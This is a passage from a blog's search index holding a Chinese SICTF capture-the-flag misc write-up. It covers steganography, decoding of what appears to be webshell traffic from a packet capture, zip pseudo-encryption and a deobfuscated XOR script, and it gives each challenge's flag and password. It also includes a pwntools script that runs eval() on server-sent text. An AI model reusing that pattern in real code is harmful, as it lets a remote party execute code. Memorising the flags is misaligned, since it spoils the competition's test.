<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SICTF-MISC-WriteUp</title>
      <link href="/posts/20175.html"/>
      <url>/posts/20175.html</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>状态简写</th><th>状态</th><th>状态说明</th></tr></thead><tbody><tr><td>W</td><td>Wait</td><td>没有人做这道题，你可以开始尝试</td></tr><tr><td>S</td><td>Stuck</td><td>题目做到一半思路卡壳</td></tr><tr><td>F</td><td>Finished</td><td>完成该题</td></tr><tr><td>1</td><td>First Blood</td><td>获得一血</td></tr><tr><td>2</td><td>Second Blood</td><td>获得二血</td></tr><tr><td>3</td><td>Third Blood</td><td>获得三血</td></tr><tr><td>L</td><td>Lack WP</td><td>完成并缺少WP</td></tr></tbody></table><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="1-F-color"><a href="#1-F-color" class="headerlink" title="1. F | color |"></a>1. F | color |</h2><p><strong>题目说明：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这些毫无规律的颜色中隐藏着怎样的小世界呢？</span><br></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><p>我不知道啥时候比赛，别人来问我题目我才知道的，然后就上线了，不然这题估计我一血应该没哈问题。</p><ol><li>下载好了题目，就是一张png的题目，这个像素这么多，而且无规律的颜色中，很显然就是颜色频率了。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117193846683.png" alt="image-20230117193846683"></p><ol start="2"><li>其他颜色平均都在700~800左右，直接把序号写上去，提取一下就出来图片，然后扫描二维码就好了。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117211745114.png" alt="image-20230117211745114"></p><p>工具链接：<a href="https://github.com/Byxs20/FrequencyColor">Byxs20&#x2F;FrequencyColor</a>，工具也是我开发，哈哈哈~</p><ol start="3"><li>扫描二维码，拿到flag</li></ol><p><strong>SICTF{448e8531-c752-4847-ae7e-0e702a8fb915}</strong></p><h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a><strong>补充：</strong></h3><p>我这题是非预期（也不算非预期，都是一个原理，但是我不是按照出题人的思路解的，这是出题人的思路）</p><p>但是出题人的意图是让我们把<code>sava.png</code>图片尾部的zip提取出来，再加上PK文件头，然后解伪加密，得到<code>encode.py</code>，再根据<code>encode.py</code>写<code>decode.py</code></p><p><strong>encode.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = Image.<span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line">flag = flag.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">new = Image.new(<span class="string">&quot;RGB&quot;</span>,flag.size)</span><br><span class="line">h=flag.height</span><br><span class="line">w=flag.width</span><br><span class="line">num=[<span class="number">0</span>,<span class="number">128</span>,<span class="number">255</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        r,g,b = flag.getpixel((i,k))</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">0</span> <span class="keyword">and</span> g == <span class="number">0</span> <span class="keyword">and</span> b ==<span class="number">0</span>:</span><br><span class="line">            new.putpixel((i,k),((random.choice(num),random.choice(num),random.choice(num))))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new.putpixel((i,k),(random.randint(<span class="number">0</span>,<span class="number">255</span>),random.randint(<span class="number">0</span>,<span class="number">255</span>),random.randint(<span class="number">0</span>,<span class="number">255</span>)))</span><br><span class="line">new.save(<span class="string">&#x27;save.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>decode.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = [<span class="number">0</span>, <span class="number">128</span>, <span class="number">255</span>]</span><br><span class="line">lis = <span class="built_in">list</span>(itertools.product(num, repeat=<span class="number">3</span>))</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;./save.png&quot;</span>)</span><br><span class="line">new_img = Image.new(<span class="string">&quot;L&quot;</span>, size=(img.width, img.height), color=<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img.height):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">        <span class="keyword">if</span> img.getpixel((x, y)) <span class="keyword">in</span> lis:</span><br><span class="line">            new_img.putpixel((x, y), value=<span class="number">0</span>)</span><br><span class="line">new_img.show()</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117211704824.png" alt="image-20230117211704824"></p><br><h2 id="2-F-签到打卡完成"><a href="#2-F-签到打卡完成" class="headerlink" title="2. F | 签到打卡完成 |"></a>2. F | 签到打卡完成 |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">听说,这个签到题扫码关注公众号回复一个特定的“Key”就可以拿到Flag，出题人把Key也藏在题目中了。</span><br><span class="line"></span><br><span class="line">聪明的人只需要两步，你需要几步？</span><br></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><ol><li>下载好题目就是一个图片</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117194351525.png" alt="image-20230117194351525"></p><ol start="2"><li>由于之前做过该平台的题目，所以知道是那个公众号，这张图片，你把亮度和对比图如图调整一下，微信运气好可以扫描出来，实在不行用CQR。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117194429716.png" alt="image-20230117194429716"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117194436660.png" alt="image-20230117194436660"></p><p><a href="http://weixin.qq.com/r/dS-v9yPE436crWeU93pn">http://weixin.qq.com/r/dS-v9yPE436crWeU93pn</a></p><ol start="3"><li>key用<code>010editor</code>打开图片就发现了</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117194501105.png" alt="image-20230117194501105"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117194509408.png" alt="image-20230117194509408"></p><p><strong>SICTF{fb23cefd-487f-42dd-a343-2a06194efc60}</strong></p><br><h2 id="3-F-Hacker"><a href="#3-F-Hacker" class="headerlink" title="3. F | Hacker |"></a>3. F | Hacker |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">树木是个大黑客，经过调查，在一次玩靶场的过程中，喜欢兔子的他把flag藏在了根目录的tmp目录下，我们截取了他回头查看flag时的流量，你能找到他藏起来的flag并进行解密吗？</span><br></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><ol><li>打开后看见了很多base64，但是一个一个复制不方便，所以我就直接用<code>tshark</code>提取。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark.exe -r .\hacker.pcapng -Y &#x27;http &amp;&amp; data-text-lines&#x27; -T fields -e text &gt; out.txt</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117194930888.png" alt="image-20230117194930888"></p><p>稍微处理一下，删掉不需要的。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117194950291.png" alt="image-20230117194950291"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">f7f89f88MS5waHAKZHZ3YV9lbWFpbC5wbmcKZTI2NGM1NWJlCi92YXIvd3d3L2h0bWwvaGFja2FibGUvdXBsb2FkcwphN2ViM2RmODc0ZQo=bbe13</span><br><span class="line"></span><br><span class="line">bbc49d5f83e5ZTI2NGM1NWJlCi92YXIvdG1wL3Bhc3N3b3JkMXNHdWlfMXNfc2h1bXUKYTdlYjNkZjg3NGUKae13e2ed</span><br><span class="line"></span><br><span class="line">e9b74d9ZmxhZy50eHQKZTI2NGM1NWJlCi92YXIvdG1wL3Bhc3N3b3JkMXNHdWlfMXNfc2h1bXUKYTdlYjNkZjg3NGUK4c61b3e96769</span><br><span class="line"></span><br><span class="line">1a0068f71eU0lDVEZ7VGhpc19pc19hX2Zha2VfZmw0ZyEhIX1lMjY0YzU1YmUKL3Zhci90bXAvcGFzc3dvcmQxc0d1aV8xc19zaHVtdQphN2ViM2RmODc0ZQo=390863c</span><br><span class="line"></span><br><span class="line">cd220ecca413ZTI2NGM1NWJlCi91c3IKYTdlYjNkZjg3NGUK42bef5c</span><br><span class="line"></span><br><span class="line">d5477d0ccYmluCmdhbWVzCmluY2x1ZGUKbGliCmxvY2FsCnNiaW4Kc2hhcmUKc3JjCmUyNjRjNTViZQovdXNyCmE3ZWIzZGY4NzRlCg==b39643995</span><br><span class="line"></span><br><span class="line">66d71bf6ZTI2NGM1NWJlCi90bXAKYTdlYjNkZjg3NGUK6258c34d556</span><br><span class="line"></span><br><span class="line">e8aeefZmxhZy50eHQKZTI2NGM1NWJlCi90bXAKYTdlYjNkZjg3NGUK954bde</span><br><span class="line"></span><br><span class="line">423aa528aVTJGc2RHVmtYMTliRU4zRDh2RmVHMzlWeVlYUHdsZTJtTVFMaDVUMUhZaVNJMVhDeDdySmhzRG5wOXFMcFVRQg0KeUlUZDA1VXUwNVpBdjBvPWUyNjRjNTViZQovdG1wCmE3ZWIzZGY4NzRlCg==ab05b5</span><br></pre></td></tr></table></figure><ol start="2"><li>使用CyberChef，复制下面的base64到CyberChef，发现解开是乱码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">423aa528aVTJGc2RHVmtYMTliRU4zRDh2RmVHMzlWeVlYUHdsZTJtTVFMaDVUMUhZaVNJMVhDeDdySmhzRG5wOXFMcFVRQg0KeUlUZDA1VXUwNVpBdjBvPWUyNjRjNTViZQovdG1wCmE3ZWIzZGY4NzRlCg==ab05b5</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117195306847.png" alt="image-20230117195306847"></p><ol start="3"><li>主要这段base64有个<code>==</code>，一般是base64结束后的补位符号，所以我们先把后面的<code>ab05b5</code>删掉，依旧乱码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">423aa528aVTJGc2RHVmtYMTliRU4zRDh2RmVHMzlWeVlYUHdsZTJtTVFMaDVUMUhZaVNJMVhDeDdySmhzRG5wOXFMcFVRQg0KeUlUZDA1VXUwNVpBdjBvPWUyNjRjNTViZQovdG1wCmE3ZWIzZGY4NzRlCg==</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117195344051.png" alt="image-20230117195344051"></p><p>我感觉前面的<code>423aa5</code>也不太对劲，就一个一个的删。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117195423404.png" alt="image-20230117195423404"></p><p>当我删了一个4，就出现了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX19bEN3D8vFeG39VyYXPwle2mMQLh5T1HYiSI1XCx7rJhsDnp9qLpUQByITd05Uu05ZAv0o=</span><br></pre></td></tr></table></figure><p>这个明显就是Aes&#x2F;Des&#x2F;Rabbit等之类的加密。</p><ol start="4"><li>同理处理下面的base64，这边我就直接放图片了</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1a0068f71eU0lDVEZ7VGhpc19pc19hX2Zha2VfZmw0ZyEhIX1lMjY0YzU1YmUKL3Zhci90bXAvcGFzc3dvcmQxc0d1aV8xc19zaHVtdQphN2ViM2RmODc0ZQo=390863c</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117195641513.png" alt="image-20230117195641513"></p><p>我们得到了密码了：password1sGui_1s_shumu</p><ol start="5"><li>注意题目的描述，喜欢兔子的他把flag藏在了根目录的tmp目录下，刚刚好是在tmp目录下，兔子就是rabbit加密。解密的网站：<a href="http://www.esjson.com/rabbitEncrypt.html">http://www.esjson.com/rabbitEncrypt.html</a></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117195925907.png" alt="image-20230117195925907"></p><p><strong>SICTF{50da673c-3b59-4a6f-81da-79cba7eb63b1}</strong></p><br><h2 id="4-F1-geek-challenge"><a href="#4-F1-geek-challenge" class="headerlink" title="4. F1 | geek_challenge |"></a>4. F1 | geek_challenge |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请使用NC连接</span><br></pre></td></tr></table></figure><p>这道题目很早就出来了，但是一直没师傅做，我也不知道为嘛，那个时候没进比赛群，然后我就说我来试试，然后遇到了题目的出错的问题。导致我脚本没办法正常跑起来，然后树木重新写了个python版本的，题目上线后，脚本直接run就好了，抢了个一血。</p><p><strong>解题思路：</strong></p><ol><li>看题目，就是问你一些简单的编程问题。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117200306905.png" alt="image-20230117200306905"></p><ol start="2"><li>第一个做完了第二个又来了，一直循环。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117200414878.png" alt="image-20230117200414878"></p><ol start="3"><li>所以写个脚本就好了</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line">io = pwn.remote(<span class="string">&quot;ctf.qsnctf.com&quot;</span>, <span class="number">10240</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    rec = io.recvline()</span><br><span class="line">    <span class="built_in">print</span>(rec.decode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;= ?&quot;</span> <span class="keyword">in</span> rec:</span><br><span class="line">        answer = <span class="built_in">eval</span>(rec.decode()[:-<span class="number">5</span>])</span><br><span class="line">        data = <span class="built_in">str</span>(answer).encode()</span><br><span class="line">        io.sendline(data)</span><br></pre></td></tr></table></figure><ol start="4"><li>run后，坐等报错即可</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117201038044.png" alt="image-20230117201038044"></p><p><strong>SICTF{29e5b2ac-f2f9-40f5-b4b8-37f93639bb48}</strong></p><br><h2 id="5-F3-EzMisc"><a href="#5-F3-EzMisc" class="headerlink" title="5. F3 | EzMisc |"></a>5. F3 | EzMisc |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个神奇的压缩包</span><br></pre></td></tr></table></figure><p>拿了个三血</p><ol><li>伪加密，09改为00</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117201130957.png" alt="image-20230117201130957"></p><ol start="2"><li>解压压缩包有个7z和zip，7z有密码，先看zip。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117201340384.png" alt="image-20230117201340384"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117201352296.png" alt="image-20230117201352296"></p><p>得到了密码<code>Password_1s_here_ohhhhh~</code>，解压开来7z，得到flag.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode ,b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">OOO000O0000000OOO =<span class="string">&#x27;&#x27;</span></span><br><span class="line">OO00000O0O00OOOOO =<span class="string">&#x27;&#x27;</span></span><br><span class="line">O0OO0OO0O0O0OOOO0 =Image .<span class="built_in">open</span> (OOO000O0000000OOO )</span><br><span class="line">O000OOO0O0000OO00 =Image .<span class="built_in">open</span> (OO00000O0O00OOOOO )</span><br><span class="line">OOO0OO0O00OO0O00O =cv2 .imread (<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">OO00OOO0OOO000OO0 =OOO0OO0O00OO0O00O .shape [<span class="number">1</span>]</span><br><span class="line">O0OOO0OOO00OO00OO =OOO0OO0O00OO0O00O .shape [<span class="number">0</span>]</span><br><span class="line">O0000OOO0O00O00OO =Image .new (<span class="string">&quot;RGB&quot;</span>,(OO00OOO0OOO000OO0 ,O0OOO0OOO00OO00OO ))</span><br><span class="line">OO00OOOO00O0OOO0O =O0OO0OO0O0O0OOOO0 .convert (<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">O000OOO0O0OO0000O =O000OOO0O0000OO00 .convert (<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> OOO0O0OO000O0O000 <span class="keyword">in</span> <span class="built_in">range</span> (OO00OOO0OOO000OO0 ):</span><br><span class="line">    <span class="keyword">for</span> OOOOO0000000O0OOO <span class="keyword">in</span> <span class="built_in">range</span> (O0OOO0OOO00OO00OO ):</span><br><span class="line">        OO0OO00O0O0000O0O ,OO000O0O00000O0O0 ,OOO0O00OO000O0O00 =OO00OOOO00O0OOO0O .getpixel ((OOO0O0OO000O0O000 ,OOOOO0000000O0OOO ))</span><br><span class="line">        OO00OOOO0OOO000OO ,O000OO0O0OO00O0O0 ,O00000OO0OO0O0OOO =O000OOO0O0OO0000O .getpixel ((OOO0O0OO000O0O000 ,OOOOO0000000O0OOO ))</span><br><span class="line">        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO</span><br><span class="line">        OO00OOOO0OOO000OO =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO</span><br><span class="line">        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO</span><br><span class="line">        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0</span><br><span class="line">        O000OO0O0OO00O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0</span><br><span class="line">        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0</span><br><span class="line">        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO000O0O00000O0O0</span><br><span class="line">        OO000O0O00000O0O0 =OO0OO00O0O0000O0O ^OO000O0O00000O0O0</span><br><span class="line">        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO000O0O00000O0O0</span><br><span class="line">        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO</span><br><span class="line">        O00000OO0OO0O0OOO =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO</span><br><span class="line">        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO</span><br><span class="line">        O0OOO0000OOOOO00O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO</span><br><span class="line">        OO0O0OOOOO0O00OO0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0</span><br><span class="line">        O00O00O00OO0O00O0 =OOO0O00OO000O0O00 ^O00000OO0OO0O0OOO</span><br><span class="line">        <span class="keyword">if</span> (O0OOO0000OOOOO00O ==<span class="number">0</span> ):</span><br><span class="line">            O0OOO0000OOOOO00O =<span class="number">255</span></span><br><span class="line">        <span class="keyword">if</span> (OO0O0OOOOO0O00OO0 ==<span class="number">0</span> ):</span><br><span class="line">            OO0O0OOOOO0O00OO0 =<span class="number">255</span></span><br><span class="line">        <span class="keyword">if</span> (O00O00O00OO0O00O0 ==<span class="number">0</span> ):</span><br><span class="line">            O00O00O00OO0O00O0 =<span class="number">255</span></span><br><span class="line">        O0OOO0000OOOOO00O =<span class="built_in">str</span> (b64encode (<span class="built_in">str</span> (O0OOO0000OOOOO00O ).encode ()),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        OO0O0OOOOO0O00OO0 =<span class="built_in">str</span> (b64encode (<span class="built_in">str</span> (OO0O0OOOOO0O00OO0 ).encode ()),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        O00O00O00OO0O00O0 =<span class="built_in">str</span> (b64encode (<span class="built_in">str</span> (O00O00O00OO0O00O0 ).encode ()),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;secret~.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)<span class="keyword">as</span> file0 :</span><br><span class="line">            <span class="built_in">print</span> (O0OOO0000OOOOO00O [::-<span class="number">1</span> ],OO0O0OOOOO0O00OO0 [::-<span class="number">1</span> ],O00O00O00OO0O00O0 [::-<span class="number">1</span> ],file = file0 )</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码被混淆了，我手动改了一下代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">img1_path = <span class="string">&#x27;&#x27;</span></span><br><span class="line">img2_path = <span class="string">&#x27;&#x27;</span></span><br><span class="line">img1 = Image .<span class="built_in">open</span>(img1_path)</span><br><span class="line">img2 = Image .<span class="built_in">open</span>(img2_path)</span><br><span class="line">img3 = cv2 .imread(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">width = img3 .shape[<span class="number">1</span>]</span><br><span class="line">height = img3 .shape[<span class="number">0</span>]</span><br><span class="line">new_img = Image .new(<span class="string">&quot;RGB&quot;</span>, (width, height))</span><br><span class="line">img1 = img1 .convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">img2 = img2 .convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        r1, g1, b1 = img1 .getpixel((x, y))</span><br><span class="line">        r2, g2, b2 = img2 .getpixel((x, y))</span><br><span class="line">        r1 = r1 ^ r2</span><br><span class="line">        r2 = r1 ^ r2</span><br><span class="line">        r1 = r1 ^ r2</span><br><span class="line">        g1 = g1 ^ g2</span><br><span class="line">        g2 = g1 ^ g2</span><br><span class="line">        g1 = g1 ^ g2</span><br><span class="line">        r1 = r1 ^ g1</span><br><span class="line">        g1 = r1 ^ g1</span><br><span class="line">        r1 = r1 ^ g1</span><br><span class="line">        g1 = g1 ^ b2</span><br><span class="line">        b2 = g1 ^ b2</span><br><span class="line">        g1 = g1 ^ b2</span><br><span class="line">        r3 = r1 ^ r2</span><br><span class="line">        g3 = g1 ^ g2</span><br><span class="line">        b3 = b1 ^ b2</span><br><span class="line">        <span class="keyword">if</span> (r3 == <span class="number">0</span>):</span><br><span class="line">            r3 = <span class="number">255</span></span><br><span class="line">        <span class="keyword">if</span> (g3 == <span class="number">0</span>):</span><br><span class="line">            g3 = <span class="number">255</span></span><br><span class="line">        <span class="keyword">if</span> (b3 == <span class="number">0</span>):</span><br><span class="line">            b3 = <span class="number">255</span></span><br><span class="line">        r3 = <span class="built_in">str</span>(b64encode(<span class="built_in">str</span>(r3).encode()), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        g3 = <span class="built_in">str</span>(b64encode(<span class="built_in">str</span>(g3).encode()), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        b3 = <span class="built_in">str</span>(b64encode(<span class="built_in">str</span>(b3).encode()), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secret~.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">            <span class="built_in">print</span>(r3[::-<span class="number">1</span>], g3[::-<span class="number">1</span>], b3[::-<span class="number">1</span>], file=f)</span><br></pre></td></tr></table></figure><p>如果实在看不懂，大概率能明白是打开了两张图片，打开f1ag.png和一张图片做xor，然后保存到了<code>secret~.txt</code>中</p><ol start="3"><li>我们先还原<code>secret~.txt</code>的图片（运行下面代码前，在当前目录新建一个out目录）</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 